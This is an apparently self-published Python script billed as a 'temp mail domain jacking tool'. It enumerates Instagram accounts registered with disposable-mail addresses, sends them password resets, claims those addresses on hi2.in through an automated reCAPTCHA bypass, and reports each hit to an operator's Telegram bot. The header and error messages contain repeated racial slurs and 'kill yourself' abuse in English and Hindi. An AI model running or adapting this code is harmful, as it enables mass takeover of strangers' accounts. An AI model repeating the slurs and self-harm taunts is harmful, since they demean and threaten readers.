"This tool is open source, which means anyone can use, modify, or contribute to it. Honestly, if you have to copy this then give proper credits else kill yourself nigger."

"यह टूल ओपन सोर्स है, मतलब कोई भी इसे इस्तेमाल, बदल या इसके विकास में हिस्सा ले सकता है। सच कहूँ तो, अगर तुम्हें इसे कॉपी करना ही है तो उचित क्रेडिट दो वरना खुद को मार डालो, नीग्रो"

"					— 𝐃"
import webbrowser

# Open a specific URL in the default web browser
webbrowser.open('')

# Alternatively, open the default homepage (no URL specified)
# webbrowser.open()


import random,os,requests,string,secrets,json;from threading import Thread,Lock;from cfonts import render;from user_agent import generate_user_agent as pybasics
domains = ["@telegmail.com", "@hi2.in"];white = '\033[1;37m';print(f"{white}");DVVMB = render('dvmb', colors=['red', 'white'], align='center')
print(DVVMB);print(""" ㅤ\x1b[1;34mㅤ[ ⚚ ]    𝐓𝚑𝚒𝚜 𝐈𝚜 𝐀 𝐓𝚎𝚖𝚙𝚖𝚊𝚒𝚕 𝐃𝚘𝚖𝚊𝚒𝚗 𝐉𝚊𝚌𝚔𝚒𝚗𝚐 𝐓𝚘𝚘𝚕 𝐁𝚢 𝐃𝕧ᴍ𝙱.""")
print();print(f""" ㅤ{white}ㅤ[ ⚚ ]    𝐄𝚗𝚝𝚎𝚛 𝐈𝙳 𝐁𝚎𝚕𝚘𝚠  [ 10 𝐃𝚒𝚐𝚒𝚝𝚜 ]  ⏎""");teleid = input(f" ㅤ{white}ㅤ➡  ㅤ");print(f""" ㅤ{white}ㅤ[ ⚚ ]    𝐄𝚗𝚝𝚎𝚛 𝐀𝚙𝚒 𝐓𝚘𝚔𝚎𝚗 𝐁𝚎𝚕𝚘𝚠 ⏎""");bottoken=input(f" ㅤ{white}ㅤ➡  ㅤ");os.system("clear");true = gen = false = 0;os.system("clear");print(DVVMB);print(f""" ㅤ{white}ㅤ➊ — hi2.in """);print(f""" ㅤ{white}ㅤ➋ — telegmail.com """);print(f""" ㅤ{white}ㅤ➌ — 𝐁𝚘𝚝𝚑 𝐃𝚘𝚖𝚊𝚒𝚗 [ 𝐑𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚍𝚎𝚍 ] """);print();print(f""" ㅤ{white}ㅤ[ ⚚ ]    𝐒𝚎𝚕𝚎𝚌𝚝 𝐅𝚛𝚘𝚖 1 / 2 / 3  ⏎""");dvmbpy = input(f" ㅤ{white}ㅤ➡  ㅤ").strip()
try:
    select = int(dvmbpy)
    if select == 1:
        domain = "@hi2.in"
    elif select == 2:
        domain = "@telegmail.com"
    elif select == 3:
        domain = None
    else:
        print("𝐊𝚒𝚕𝚕 𝐘𝚘𝚞𝚛𝚜𝚎𝚕𝚏 𝐍𝚒𝚐𝚐𝚎𝚛")
        exit()
except ValueError:
    print("𝐊𝚒𝚕𝚕 𝐘𝚘𝚞𝚛𝚜𝚎𝚕𝚏 𝐍𝚒𝚐𝚐𝚎𝚛")
    exit()

def tele(address):    
    bothit = f"""
┏━━━━━━━━━━━━━━━━◊━◊━◊━◊━◊━◊
┃ ❝ 𝑫𝒗𝒎𝒃 𝑆𝑒𝑛𝑡 𝐴 𝑇𝑒𝑚𝑝 𝑀𝑎𝑖𝑙 𝐻𝑖𝑡 ❞
┗━━━━━━━━━━━━━━━◊━◊━◊
┏━━━━━━━━━━━━━━━◊━◊━◊
┃⁅ 𓋹 ⁆  𝐇𝚒𝚝𝚜 𝐆𝚘𝚝 ➯ {true}
┃⁅ 𓋹 ⁆  𝐌𝚊𝚒𝚕 ➯ {address}
┃⁅ 𓋹 ⁆  𝐏𝚘𝚜𝚜𝚒𝚋𝚕𝚎 𝐃𝚊𝚝𝚎 ➯ 2020 - 25
┗━━━━━━━━━━━━━━━━◊━◊━◊━◊━◊━◊
""";inl = [
    [
        {"text": "𝐂𝚑𝚊𝚗𝚗𝚎𝚕 📣", "url": "https://t.me/dvmbpy"},
        {"text": "👨‍💻", "url": "https://t.me/dvvmb"}
    ],#"print(f"Telegram Button).... what are you looking at fuckass
    [
        {"text": "𝐇𝚘𝚠 𝐓𝚘 𝐉𝚊𝚌𝚔 ❔", "url": "https://telegra.ph/TempMail-Jacking-08-27"}
    ]
];dvvmb = {
    "text": bothit,
    "reply_markup": json.dumps({"inline_keyboard": inl}),
    "chat_id": teleid
};requests.get(f"https://api.telegram.org/bot{bottoken}/sendMessage", params=dvvmb)
    txt = f"""
┏━━━━━━━━━━━━━━━━◊━◊━◊━◊━◊━◊
┃ ❝ 𝑫𝒗𝒎𝒃 𝑆𝑒𝑛𝑡 𝐴 𝑇𝑒𝑚𝑝 𝑀𝑎𝑖𝑙 𝐻𝑖𝑡 ❞
┗━━━━━━━━━━━━━━━◊━◊━◊
┏━━━━━━━━━━━━━━━◊━◊━◊
┃⁅ 𓋹 ⁆  𝐇𝚒𝚝𝚜 𝐆𝚘𝚝 ➯ {true}
┃⁅ 𓋹 ⁆  𝐌𝚊𝚒𝚕 ➯ {address}
┃⁅ 𓋹 ⁆  𝐏𝚘𝚜𝚜𝚒𝚋𝚕𝚎 𝐃𝚊𝚝𝚎 ➯ 2020 - 25
┗━━━━━━━━━━━━━━━━◊━◊━◊━◊━◊━◊
"""        
    try:
        with open('temp.txt', 'a', encoding='utf-8') as file:
        	file.write(txt + '\n\n\n')
    except Exception as e:
    	print()

def api(email):
    global true,false;address = email
    if "@" in email:domain = email.split("@")[1];email = email.split("@")[0]
    if "already taken" in str(requests.post("https://hi2.in/api/custom", data={'domain': domain,'prefix': email,'recaptcha': recaptcha(),}, headers={'User-Agent': "Mozilla/5.0",'Accept': "application/json, text/plain, */*",'authorization': "Basic bnVsbA==",}).json()):false+=1
    else:true+=1;tele(address)

def DVMB(domain=None):
    while True:
        if domain is None:
            dopamine = domains[random.randint(0, 1)]
        else:
            dopamine = domain
        mail = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
        with DV:
            if mail in MB:
                continue
            MB.add(mail)
        email = mail + dopamine
        oblivion(email)

def oblivion(email):
    global false,true,gen
    try:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"""
		{white}┌────────────━┿──┿━─────────────┐
	 ㅤ{white}𝐇𝚒𝚝𝚜 ➙ \x1b[1;32m{true}
	 ㅤ ㅤ ㅤ{white}𝐅𝚊𝚕𝚜𝚎 ➙ \x1b[1;31m{false}
	 ㅤ ㅤ ㅤ ㅤㅤ {white}𝐆𝚎𝚗 ➙ \x1b[1;36m{gen}
	 ㅤ ㅤㅤ ㅤㅤㅤ  ㅤ {white}𝐁𝚢 ➙ \x1b[1;33m𝐃𝕧ᴍ𝐁
		{white}└────────────━┿──┿━────────────┘
""")
            if 'email_is_taken' in requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/',headers={'accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/signup/email/','user-agent': pybasics(),'x-csrftoken': secrets.token_hex(16)},data={'email': email}).text:
                    sendreset(email)
                    os.system('clear' if os.name == 'posix' else 'cls')
                    print(f"""
		{white}┌────────────━┿──┿━─────────────┐
	 ㅤ{white}𝐇𝚒𝚝𝚜 ➙ \x1b[1;32m{true}
	 ㅤ ㅤ ㅤ{white}𝐅𝚊𝚕𝚜𝚎 ➙ \x1b[1;31m{false}
	 ㅤ ㅤ ㅤ ㅤㅤ {white}𝐆𝚎𝚗 ➙ \x1b[1;36m{gen}
	 ㅤ ㅤㅤ ㅤㅤㅤ  ㅤ {white}𝐁𝚢 ➙ \x1b[1;33m𝐃𝕧ᴍ𝐁
		{white}└────────────━┿──┿━────────────┘
""")
            else:
                    false += 1
    except :pass

def recaptcha():
	key = """6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct""";dvmb = """aHR0cHM6Ly9oaTIuaW46NDQz""";ps = f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={key}&co={dvmb}&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible".split('?')[1];tokval = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{ps}', timeout = 67,).text.split('recaptcha-token" value="')[1].split('"')[0]
	try:
		return requests.post(f'https://www.google.com/recaptcha/enterprise/reload', data=f"v={ps.split('v=')[1].split('&')[0]}&reason=q&c={tokval}&k={key}&co={dvmb}&hl=en&size=invisible", headers={"User-Agent": "Mozilla/5.0","Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{ps}","Content-Type": "application/x-www-form-urlencoded"}).text.split('resp","')[1].split('"')[0]
	except:return None
	
def sendreset(email):
    try:
        rr = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',params={'hl': 'ar'}, cookies={'ig_did': '8BDD7083-B901-493B-8429-61451996147E','datr': 'UR7CaGf-Z3B_vTRwCRbGRlDt','mid': 'aMIeUQABAAEhZs4ZQo96QTqDs-5U','dpr': '3.178847074508667','ig_nrcb': '1','csrftoken': 'r5btvT6WnWcHxin7Gx9GdZ9slP4RBLum','wd': '809x1531',},headers={'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/password/reset/?hl=ar','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36','x-asbd-id': '359341','x-csrftoken': 'r5btvT6WnWcHxin7Gx9GdZ9slP4RBLum','x-ig-app-id': '936619743392459','x-requested-with': 'XMLHttpRequest','x-web-session-id': f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=5))}:{''.join(random.choices(string.ascii_lowercase + string.digits, k=5))}:{random.randint(100,999)}",}, data={'email_or_username': email, 'jazoest': str(random.randint(10000, 99999))}, timeout=67)
        try:
            global gen,false,true
            if rr.json().get("message"):
            	gen += 1
            	os.system('clear' if os.name == 'posix' else 'cls')
            	print(f"""
		{white}┌────────────━┿──┿━─────────────┐
	 ㅤ{white}𝐇𝚒𝚝𝚜 ➙ \x1b[1;32m{true}
	 ㅤ ㅤ ㅤ{white}𝐅𝚊𝚕𝚜𝚎 ➙ \x1b[1;31m{false}
	 ㅤ ㅤ ㅤ ㅤㅤ {white}𝐆𝚎𝚗 ➙ \x1b[1;36m{gen}
	 ㅤ ㅤㅤ ㅤㅤㅤ  ㅤ {white}𝐁𝚢 ➙ \x1b[1;33m𝐃𝕧ᴍ𝐁
		{white}└────────────━┿──┿━────────────┘
""")
            elif rr.json().get("toast_message"):
                api(email)
                gen += 1                
                os.system('clear' if os.name == 'posix' else 'cls')
                print(f"""
		{white}┌────────────━┿──┿━─────────────┐
	 ㅤ{white}𝐇𝚒𝚝𝚜 ➙ \x1b[1;32m{true}
	 ㅤ ㅤ ㅤ{white}𝐅𝚊𝚕𝚜𝚎 ➙ \x1b[1;31m{false}
	 ㅤ ㅤ ㅤ ㅤㅤ {white}𝐆𝚎𝚗 ➙ \x1b[1;36m{gen}
	 ㅤ ㅤㅤ ㅤㅤㅤ  ㅤ {white}𝐁𝚢 ➙ \x1b[1;33m𝐃𝕧ᴍ𝐁
		{white}└────────────━┿──┿━────────────┘
""")
            else:
                gen += 1                                                        
        except:pass
    except:pass

for _ in range(50):
    Thread(target=DVMB,args=(domain,)).start()